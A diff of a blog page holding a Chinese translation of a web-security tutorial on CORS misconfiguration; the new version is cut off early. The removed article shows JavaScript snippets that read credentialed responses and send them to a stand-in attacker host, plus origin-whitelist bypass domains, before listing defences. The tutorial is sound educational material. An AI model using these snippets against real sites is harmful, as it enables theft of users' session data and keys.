@@ -1,111 +1,141 @@
-<!doctype html><html lang=en><head><title>web 安全之 CORS · 凌虚 Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="凌虚"><meta name=description content="web 安全之 CORS"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="web 安全之 CORS"><meta name=twitter:description content="web 安全之 CORS"><meta property="og:title" content="web 安全之 CORS"><meta property="og:description" content="web 安全之 CORS"><meta property="og:type" content="article"><meta property="og:url" content="https://rifewang.github.io/translation/web-security/cors/cors/"><meta property="article:section" content="translation"><meta property="article:published_time" content="2021-02-28T01:00:00+08:00"><meta property="article:modified_time" content="2021-02-28T01:00:00+08:00"><link rel=canonical href=https://rifewang.github.io/translation/web-security/cors/cors/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.0fa2dc75ed1b76894ac0e062b10a6c4730daa745096fa120114b290ed8a48788.css integrity="sha256-D6Lcde0bdolKwOBisQpsRzDap0UJb6EgEUspDtikh4g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.593028e7f7ac55c003b79c230d1cd411bb4ca53b31556c3abb7f027170e646e9.css integrity="sha256-WTAo5/esVcADt5wjDRzUEbtMpTsxVWw6u38CcXDmRuk=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.110.0"></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>凌虚 Blog</a>
-<input type=checkbox id=menu-toggle>
-<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>博客</a></li><li class=navigation-item><a class=navigation-link href=/translation/>译文</a></li><li class=navigation-item><a class=navigation-link href=/about/>关于</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://rifewang.github.io/translation/web-security/cors/cors/>web 安全之 CORS</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
-<time datetime=2021-02-28T01:00:00+08:00>February 28, 2021</time></span>
-<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
-2-minute read</span></div><div class=categories><i class="fa fa-folder" aria-hidden=true></i>
-<a href=/categories/web-security/>web security</a></div></div></header><div class=post-content><h1 id=cross-origin-resource-sharing-cors>Cross-origin resource sharing (CORS)
-<a class=heading-link href=#cross-origin-resource-sharing-cors><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h1><p>在本节中，我们将解释什么是跨域资源共享（<code>CORS</code>），并描述一些基于 <code>CORS</code> 的常见攻击示例，以及讨论如何防御这些攻击。</p><h2 id=cors跨域资源共享是什么>CORS（跨域资源共享）是什么？
-<a class=heading-link href=#cors%e8%b7%a8%e5%9f%9f%e8%b5%84%e6%ba%90%e5%85%b1%e4%ba%ab%e6%98%af%e4%bb%80%e4%b9%88><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p><code>CORS</code>（跨域资源共享）是一种浏览器机制，它允许对位于当前访问域之外的资源进行受控访问。它扩展并增加了同源策略的灵活性。然而，如果一个网站的 <code>CORS</code> 策略配置和实现不当，它也可能导致基于跨域的攻击。<code>CORS</code> 不是针对跨源攻击（例如跨站请求伪造 <code>CSRF</code>）的保护。</p><h2 id=same-origin-policy同源策略>Same-origin policy（同源策略）
-<a class=heading-link href=#same-origin-policy%e5%90%8c%e6%ba%90%e7%ad%96%e7%95%a5><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>同源策略是一种限制性的跨域规范，它限制了网站与源域之外资源交互的能力。同源策略是多年前定义的，用于应对潜在的恶意跨域交互，例如一个网站从另一个网站窃取私人数据。它通常允许域向其他域发出请求，但不允许访问响应。</p><p>更多内容请参考 <a href=./Same-origin-policy.md>Same-origin-policy</a> 。</p><h2 id=同源策略的放宽>同源策略的放宽
-<a class=heading-link href=#%e5%90%8c%e6%ba%90%e7%ad%96%e7%95%a5%e7%9a%84%e6%94%be%e5%ae%bd><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>同源策略具有很大的限制性，因此人们设计了很多方法去规避这些限制。许多网站与子域或第三方网站的交互方式要求完全的跨域访问。使用跨域资源共享（<code>CORS</code>）可以有控制地放宽同源策略。</p><p><code>CORS</code> 协议使用一组 HTTP header 来定义可信的 web 域和相关属性，例如是否允许通过身份验证的访问。浏览器和它试图访问的跨域网站之间进行这些 header 的交换。</p><p>更多内容请参考 <a href=./Access-control-allow-origin.md>CORS and the Access-Control-Allow-Origin response header</a> 。</p><h2 id=cors-配置不当引发的漏洞>CORS 配置不当引发的漏洞
-<a class=heading-link href=#cors-%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%bc%95%e5%8f%91%e7%9a%84%e6%bc%8f%e6%b4%9e><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>现在许多网站使用 <code>CORS</code> 来允许来自子域和可信的第三方的访问。他们对 <code>CORS</code> 的实现可能包含有错误或过于放宽，这可能导致可利用的漏洞。</p><h3 id=服务端-acao-直接返回客户端的-origin>服务端 ACAO 直接返回客户端的 Origin
-<a class=heading-link href=#%e6%9c%8d%e5%8a%a1%e7%ab%af-acao-%e7%9b%b4%e6%8e%a5%e8%bf%94%e5%9b%9e%e5%ae%a2%e6%88%b7%e7%ab%af%e7%9a%84-origin><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>有些应用程序需要允许很多其它域的访问。维护一个允许域的列表需要付出持续的努力，任何差错都有可能造成破坏。因此，应用程序可能使用一些更加简单的方法来达到最终目的。</p><p>一种方法是从请求头中读取 <code>Origin</code>，然后将其作为 <code>Access-Control-Allow-Origin</code> 响应头返回。例如，应用程序接受了以下请求：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /sensitive-victim-data HTTP/1.1
-</span></span><span style=display:flex><span>Host: vulnerable-website.com
-</span></span><span style=display:flex><span>Origin: https://malicious-website.com
-</span></span><span style=display:flex><span>Cookie: sessionid=...
-</span></span></code></pre></div><p>然后，其响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: https://malicious-website.com
-</span></span><span style=display:flex><span>Access-Control-Allow-Credentials: true
-</span></span></code></pre></div><p>响应头表明允许从请求域进行访问，并且跨域请求可以包括 cookies（<code>Access-Control-Allow-Credentials: true</code>），因此浏览器将会在会话中进行处理。</p><p>由于应用程序在 <code>Access-Control-Allow-Origin</code> 头中直接返回了请求域，这意味着任何域都可以访问资源。如果响应中包含了任何敏感信息，如 API key 或者 CSRF token 则都可以被获取，你可以在你的网站上放置以下脚本进行检索：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>var req = new XMLHttpRequest();
-</span></span><span style=display:flex><span>req.onload = reqListener;
-</span></span><span style=display:flex><span>req.open(&#39;get&#39;,&#39;https://vulnerable-website.com/sensitive-victim-data&#39;,true);
-</span></span><span style=display:flex><span>req.withCredentials = true;
-</span></span><span style=display:flex><span>req.send();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>function reqListener() {
-</span></span><span style=display:flex><span>location=&#39;//malicious-website.com/log?key=&#39;+this.responseText;
-</span></span><span style=display:flex><span>};
-</span></span></code></pre></div><h3 id=origin-处理漏洞>Origin 处理漏洞
-<a class=heading-link href=#origin-%e5%a4%84%e7%90%86%e6%bc%8f%e6%b4%9e><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>某些应用程序使用白名单机制来实现可信来源的访问允许。当收到 CORS 请求时，将请求头中的 origin 与白名单进行比较，如果在白名单中，则在 <code>Access-Control-Allow-Origin</code> 头中返回请求的 origin 以允许其跨域访问。例如，应用程序收到了如下的请求：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /data HTTP/1.1
-</span></span><span style=display:flex><span>Host: normal-website.com
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>Origin: https://innocent-website.com
-</span></span></code></pre></div><p>应用程序检查白名单列表，如果 origin 在表中，则响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: https://innocent-website.com
-</span></span></code></pre></div><p>在实现 CORS origin 白名单时很可能会犯一些失误。某个组织决定允许从其所有子域（包括尚未存在的未来子域）进行访问。应用程序允许从其他组织的域（包括其子域）进行访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现中的任何失误都可能导致访问权限被授予意外的外部域。</p><p>例如，假设应用程序允许以下结尾的所有域的访问权限：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>normal-website.com
-</span></span></code></pre></div><p>攻击者则可以通过注册以下域来获得访问权限（结尾匹配）：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>hackersnormal-website.com
-</span></span></code></pre></div><p>或者应用程序允许以下开头的所有域的访问权限：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>normal-website.com
-</span></span></code></pre></div><p>攻击者则可以使用以下域获得访问权限（开头匹配）：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>normal-website.com.evil-user.net
-</span></span></code></pre></div><h3 id=origin-白名单允许-null-值>Origin 白名单允许 null 值
-<a class=heading-link href=#origin-%e7%99%bd%e5%90%8d%e5%8d%95%e5%85%81%e8%ae%b8-null-%e5%80%bc><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>浏览器会在以下情况下发送值为 null 的 Origin 头：</p><ul><li>跨站点重定向</li><li>来自序列化数据的请求</li><li>使用 <code>file:</code> 协议的请求</li><li>沙盒中的跨域请求</li></ul><p>某些应用程序可能会在白名单中允许 null 以方便本地开发。例如，假设应用程序收到了以下跨域请求：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /sensitive-victim-data
-</span></span><span style=display:flex><span>Host: vulnerable-website.com
-</span></span><span style=display:flex><span>Origin: null
-</span></span></code></pre></div><p>服务器响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: null
-</span></span><span style=display:flex><span>Access-Control-Allow-Credentials: true
-</span></span></code></pre></div><p>在这种情况下，攻击者可以使用各种技巧生成 Origin 为 null 的请求以通过白名单，从而获得访问权限。例如，可以使用 <code>iframe</code> 沙盒进行跨域请求：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34; src=&#34;data:text/html,&lt;script&gt;
-</span></span><span style=display:flex><span>var req = new XMLHttpRequest();
-</span></span><span style=display:flex><span>req.onload = reqListener;
-</span></span><span style=display:flex><span>req.open(&#39;get&#39;,&#39;vulnerable-website.com/sensitive-victim-data&#39;,true);
-</span></span><span style=display:flex><span>req.withCredentials = true;
-</span></span><span style=display:flex><span>req.send();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>function reqListener() {
-</span></span><span style=display:flex><span>location=&#39;malicious-website.com/log?key=&#39;+this.responseText;
-</span></span><span style=display:flex><span>};
-</span></span><span style=display:flex><span>&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;
-</span></span></code></pre></div><h3 id=通过-cors-信任关系利用-xss>通过 CORS 信任关系利用 XSS
-<a class=heading-link href=#%e9%80%9a%e8%bf%87-cors-%e4%bf%a1%e4%bb%bb%e5%85%b3%e7%b3%bb%e5%88%a9%e7%94%a8-xss><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p><code>CORS</code> 会在两个域之间建立信任关系，即使 <code>CORS</code> 是正确的配置，但是如果某个受信任的网站存在 XSS 漏洞，那么攻击者就可以利用 XSS 漏洞注入脚本，进而从受信任的网站上获取敏感信息。</p><p>假设请求为：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /api/requestApiKey HTTP/1.1
-</span></span><span style=display:flex><span>Host: vulnerable-website.com
-</span></span><span style=display:flex><span>Origin: https://subdomain.vulnerable-website.com
-</span></span><span style=display:flex><span>Cookie: sessionid=...
-</span></span></code></pre></div><p>如果服务器响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
-</span></span><span style=display:flex><span>Access-Control-Allow-Credentials: true
-</span></span></code></pre></div><p>那么攻击者可以通过 <code>subdomain.vulnerable-website.com</code> 网站上的 XSS 漏洞去获取一些敏感数据：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
-</span></span></code></pre></div><h3 id=使用配置有问题的-cors-中断-tls>使用配置有问题的 CORS 中断 TLS
-<a class=heading-link href=#%e4%bd%bf%e7%94%a8%e9%85%8d%e7%bd%ae%e6%9c%89%e9%97%ae%e9%a2%98%e7%9a%84-cors-%e4%b8%ad%e6%96%ad-tls><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>假设一个严格使用 HTTPS 的应用程序也通过白名单信任了一个使用 HTTP 的子域。例如，当应用程序收到以下请求时：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /api/requestApiKey HTTP/1.1
-</span></span><span style=display:flex><span>Host: vulnerable-website.com
-</span></span><span style=display:flex><span>Origin: http://trusted-subdomain.vulnerable-website.com
-</span></span><span style=display:flex><span>Cookie: sessionid=...
-</span></span></code></pre></div><p>应用程序响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
-</span></span><span style=display:flex><span>Access-Control-Allow-Credentials: true
-</span></span></code></pre></div><p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 来破坏受害者与应用程序的正常交互。攻击步骤如下：</p><ul><li>受害者用户发出任何纯 HTTP 请求。</li><li>攻击者将重定向注入到：<code>http://trusted-subdomain.vulnerable-website.com</code></li><li>受害者的浏览器遵循重定向。</li><li>攻击者截获纯 HTTP 请求，返回伪造的响应给受害者，并发出恶意的 CORS 请求给：<code>https://vulnerable-website.com</code></li><li>受害者的浏览器发出 CORS 请求，origin 为：<code>http://trusted-subdomain.vulnerable-website.com</code></li><li>应用程序允许请求，因为这是一个白名单域，请求的敏感数据在响应中返回。</li><li>攻击者的欺骗页面可以读取敏感数据并将其传输到攻击者控制下的任何域。</li></ul><p>即使易受攻击的网站对 HTTPS 的使用没有漏洞，并且没有 HTTP 端点，同时所有 Cookie 都标记为安全，此攻击也是有效的。</p><h3 id=内网和无凭证的-cors>内网和无凭证的 CORS
-<a class=heading-link href=#%e5%86%85%e7%bd%91%e5%92%8c%e6%97%a0%e5%87%ad%e8%af%81%e7%9a%84-cors><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>大部分 <code>CORS</code> 攻击都需要以下响应头的存在：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Access-Control-Allow-Credentials: true
-</span></span></code></pre></div><p>没有这个响应头，受害者的浏览器将不会发送 cookies ，这意味着攻击者只能访问无需用户验证的内容，而这些内容直接访问目标网站就可以轻松获得。</p><p>然而，有一种情况下攻击者无法直接访问网站：网站是内网，并且是私有 IP 地址空间。内网的安全标准通常低于外网，这使得攻击者发现漏洞后可以获得进一步的访问权限。例如，某个私有网络中的跨域请求：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /reader?url=doc1.pdf
-</span></span><span style=display:flex><span>Host: intranet.normal-website.com
-</span></span><span style=display:flex><span>Origin: https://normal-website.com
-</span></span></code></pre></div><p>服务器响应：</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
-</span></span><span style=display:flex><span>Access-Control-Allow-Origin: *
-</span></span></code></pre></div><p>服务器信任所有来源的跨域请求，而且无需凭证。如果私有IP地址空间内的用户访问公共互联网，则可以从外部站点执行基于 CORS 的攻击，该站点使用受害者的浏览器作为访问内网资源的代理。</p><h2 id=如何防护基于-cors-的攻击>如何防护基于 CORS 的攻击
-<a class=heading-link href=#%e5%a6%82%e4%bd%95%e9%98%b2%e6%8a%a4%e5%9f%ba%e4%ba%8e-cors-%e7%9a%84%e6%94%bb%e5%87%bb><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p><code>CORS</code> 漏洞主要是由于错误的配置而产生的，因此防护措施主要也是如何进行正确配置的问题。下面将会描述一些有效的方法。</p><h3 id=跨域请求的正确配置>跨域请求的正确配置
-<a class=heading-link href=#%e8%b7%a8%e5%9f%9f%e8%af%b7%e6%b1%82%e7%9a%84%e6%ad%a3%e7%a1%ae%e9%85%8d%e7%bd%ae><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>如果 web 资源包含敏感信息，那么应该在 <code>Access-Control-Allow-Origin</code> 头中声明允许的来源。</p><h3 id=只允许受信任的站点>只允许受信任的站点
-<a class=heading-link href=#%e5%8f%aa%e5%85%81%e8%ae%b8%e5%8f%97%e4%bf%a1%e4%bb%bb%e7%9a%84%e7%ab%99%e7%82%b9><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p><code>Access-Control-Allow-Origin</code> 头只能是受信任的站点。<code>Access-Control-Allow-Origin</code> 直接使用跨域请求的 origin 而不验证是很容易被利用的，应该避免。</p><h3 id=白名单中避免-null>白名单中避免 null
-<a class=heading-link href=#%e7%99%bd%e5%90%8d%e5%8d%95%e4%b8%ad%e9%81%bf%e5%85%8d-null><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>避免 <code>Access-Control-Allow-Origin: null</code> 。来自内部文档和沙盒请求的跨域资源调用可以指定 origin 为 null 的。CORS 头应该根据私有和公共服务器的可信来源正确定义。</p><h3 id=避免在内部网络中使用通配符>避免在内部网络中使用通配符
-<a class=heading-link href=#%e9%81%bf%e5%85%8d%e5%9c%a8%e5%86%85%e9%83%a8%e7%bd%91%e7%bb%9c%e4%b8%ad%e4%bd%bf%e7%94%a8%e9%80%9a%e9%85%8d%e7%ac%a6><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p>避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅仅依靠网络配置来保护内部资源是不够的。</p><h3 id=cors-不是服务端安全策略的替代品>CORS 不是服务端安全策略的替代品
-<a class=heading-link href=#cors-%e4%b8%8d%e6%98%af%e6%9c%8d%e5%8a%a1%e7%ab%af%e5%ae%89%e5%85%a8%e7%ad%96%e7%95%a5%e7%9a%84%e6%9b%bf%e4%bb%a3%e5%93%81><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h3><p><code>CORS</code> 定义的只是浏览器行为，永远不能替代服务端对敏感数据的保护，毕竟攻击者可以直接在其它环境中伪造来自任何 origin 的请求。因此，除了正确配置的 CORS 之外，web 服务端仍然需要使用诸如身份验证和会话管理等措施对敏感数据进行保护。</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
-2019 -
-2023
-凌虚
-·
-Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>web 安全之 CORS - 凌虚 Blog</title><meta name=Description content="web 安全之 CORS"><meta property="og:title" content="web 安全之 CORS"><meta property="og:description" content="web 安全之 CORS"><meta property="og:type" content="article"><meta property="og:url" content="https://rifewang.github.io/translation/web-security/cors/cors/"><meta property="og:image" content="https://rifewang.github.io/images/avatar.png"><meta property="article:section" content="translation"><meta property="article:published_time" content="2021-02-28T01:00:00+08:00"><meta property="article:modified_time" content="2023-02-21T11:33:46+08:00"><meta property="og:site_name" content="凌虚 Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://rifewang.github.io/images/avatar.png"><meta name=twitter:title content="web 安全之 CORS"><meta name=twitter:description content="web 安全之 CORS"><meta name=application-name content="凌虚的博客"><meta name=apple-mobile-web-app-title content="凌虚的博客"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=canonical href=https://rifewang.github.io/translation/web-security/cors/cors/><link rel=prev href=https://rifewang.github.io/translation/web-security/cors/access-control-allow-origin/><link rel=next href=https://rifewang.github.io/translation/web-security/directory-traversal/directory-traversal/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"web 安全之 CORS","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/rifewang.github.io\/translation\/web-security\/cors\/cors\/"},"genre":"translation","wordcount":2888,"url":"https:\/\/rifewang.github.io\/translation\/web-security\/cors\/cors\/","datePublished":"2021-02-28T01:00:00+08:00","dateModified":"2023-02-21T11:33:46+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"凌虚"},"description":"web 安全之 CORS"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"light"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"light"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="凌虚 Blog">凌虚的博客</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/about/>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="凌虚 Blog">凌虚的博客</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">web 安全之 CORS</h1><div class=content id=content><h1 id=cross-origin-resource-sharing-cors>Cross-origin resource sharing (CORS)</h1><p>在本节中，我们将解释什么是跨域资源共享（<code>CORS</code>），并描述一些基于 <code>CORS</code> 的常见攻击示例，以及讨论如何防御这些攻击。</p><h2 id=cors跨域资源共享是什么>CORS（跨域资源共享）是什么？</h2><p><code>CORS</code>（跨域资源共享）是一种浏览器机制，它允许对位于当前访问域之外的资源进行受控访问。它扩展并增加了同源策略的灵活性。然而，如果一个网站的 <code>CORS</code> 策略配置和实现不当，它也可能导致基于跨域的攻击。<code>CORS</code> 不是针对跨源攻击（例如跨站请求伪造 <code>CSRF</code>）的保护。</p><h2 id=same-origin-policy同源策略>Same-origin policy（同源策略）</h2><p>同源策略是一种限制性的跨域规范，它限制了网站与源域之外资源交互的能力。同源策略是多年前定义的，用于应对潜在的恶意跨域交互，例如一个网站从另一个网站窃取私人数据。它通常允许域向其他域发出请求，但不允许访问响应。</p><p>更多内容请参考 <a href=./Same-origin-policy.md rel>Same-origin-policy</a> 。</p><h2 id=同源策略的放宽>同源策略的放宽</h2><p>同源策略具有很大的限制性，因此人们设计了很多方法去规避这些限制。许多网站与子域或第三方网站的交互方式要求完全的跨域访问。使用跨域资源共享（<code>CORS</code>）可以有控制地放宽同源策略。</p><p><code>CORS</code> 协议使用一组 HTTP header 来定义可信的 web 域和相关属性，例如是否允许通过身份验证的访问。浏览器和它试图访问的跨域网站之间进行这些 header 的交换。</p><p>更多内容请参考 <a href=./Access-control-allow-origin.md rel>CORS and the Access-Control-Allow-Origin response header</a> 。</p><h2 id=cors-配置不当引发的漏洞>CORS 配置不当引发的漏洞</h2><p>现在许多网站使用 <code>CORS</code> 来允许来自子域和可信的第三方的访问。他们对 <code>CORS</code> 的实现可能包含有错误或过于放宽，这可能导致可利用的漏洞。</p><h3 id=服务端-acao-直接返回客户端的-origin>服务端 ACAO 直接返回客户端的 